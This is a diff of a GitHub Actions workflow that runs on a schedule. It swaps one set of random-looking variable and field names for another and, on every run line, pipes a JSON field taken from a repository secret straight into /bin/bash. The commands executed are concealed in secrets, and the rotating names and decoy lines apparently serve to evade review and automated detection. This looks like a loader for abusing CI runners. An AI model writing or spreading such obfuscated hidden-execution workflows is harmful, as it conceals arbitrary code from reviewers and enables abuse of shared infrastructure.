@@ -1,9 +1,8 @@
 name: dashengwanglei
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 2/6 * * *'
+    - cron: '32 3/6 * * *'
 
 jobs:
   build:
@@ -13,20 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: dashengwanglei
         env:
-          zocqi1: ${{ secrets.zocqi1 }}
+          tcwja44659: ${{ secrets.tcwja44659 }}
         run: |
-          echo $zocqi1 | jq -r .zlgn3 | /bin/bash
-          echo $xiqs87 | jq -r .wbqh42089 | /bin/bash
-          echo $fafr0915 | jq -r .gibbk68 | /bin/bash
-          echo $crbad99 | jq -r .sym410 | /bin/bash
-          echo $zl02723 | jq -r .q55416 | /bin/bash
-          echo $whzs4 | jq -r .kl2533 | /bin/bash
-          echo $kqzi3 | jq -r .ef80 | /bin/bash
-          echo $nhfja9 | jq -r .f3159 | /bin/bash
-          echo $v4009 | jq -r .wzulz65062 | /bin/bash
-          echo $j5808 | jq -r .fw2187 | /bin/bash
-          echo $g65686 | jq -r .vc8 | /bin/bash
-          echo $fjmy68 | jq -r .gi4 | /bin/bash
-          echo $qs4 | jq -r .wevma302 | /bin/bash
-          echo $bmzc1355 | jq -r .ak8931 | /bin/bash
+          echo $tcwja44659 | jq -r .yrl012 | /bin/bash
+          echo $dp4 | jq -r .srdln8179 | /bin/bash
+          echo $dz7 | jq -r .tkm667 | /bin/bash
+          echo $mulcw16434 | jq -r .ua2566 | /bin/bash
+          echo $zx8 | jq -r .ivmki69 | /bin/bash
+          echo $zmgp22 | jq -r .izhw5824 | /bin/bash
+          echo $n18 | jq -r .fmu4 | /bin/bash
+          echo $nvpsv80 | jq -r .rk264 | /bin/bash
+          echo $cij617 | jq -r .lvv6 | /bin/bash
+          echo $yoohb03 | jq -r .a61 | /bin/bash
+          echo $lxnmj116 | jq -r .ttm642 | /bin/bash
+          echo $eob088 | jq -r .gryh08950 | /bin/bash
+          echo $bb5738 | jq -r .gy64 | /bin/bash
+          echo $a00916 | jq -r .ov8436 | /bin/bash
+          echo $acjo7 | jq -r .yfc8 | /bin/bash
 
